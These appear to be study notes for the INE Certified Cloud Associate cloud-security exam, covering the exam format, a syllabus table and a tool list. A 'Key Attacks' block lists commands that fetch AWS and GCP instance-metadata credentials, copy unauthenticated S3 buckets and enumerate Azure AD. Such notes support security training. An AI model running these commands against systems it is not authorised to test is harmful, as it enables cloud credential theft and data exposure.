# ICCA

**INE Certified Cloud Associate** — cloud security fundamentals covering AWS, Azure, and GCP from an attacker and defender perspective.

## Exam Format

- **Duration:** 3 hours
- **Format:** Multiple choice + practical scenario questions
- **Passing Score:** 70%

## Syllabus

| Domain | Topics |
|--------|--------|
| Cloud Fundamentals | IaaS/PaaS/SaaS, shared responsibility model, cloud architecture |
| AWS Security | IAM, S3 bucket misconfigs, EC2 metadata, Lambda, CloudTrail |
| Azure Security | AAD, RBAC, storage accounts, Key Vault, Azure AD enumeration |
| GCP Security | IAM, Cloud Storage, GCE metadata, service accounts |
| Cloud Attack Techniques | SSRF → metadata, misconfigured storage, privilege escalation in cloud |
| Cloud Defense | Logging, monitoring, CSPM, CIS benchmarks |

## Key Attacks

```bash
# AWS metadata (from SSRF or EC2 shell)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Enumerate S3 buckets
aws s3 ls s3://bucket-name --no-sign-request
aws s3 sync s3://bucket-name . --no-sign-request

# Azure AD enumeration
Get-AzureADUser
Invoke-AADIntReconAsGuest

# GCP metadata
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

## Tools

`pacu` `cloudmapper` `ScoutSuite` `prowler` `aws-cli` `az-cli` `gcloud`
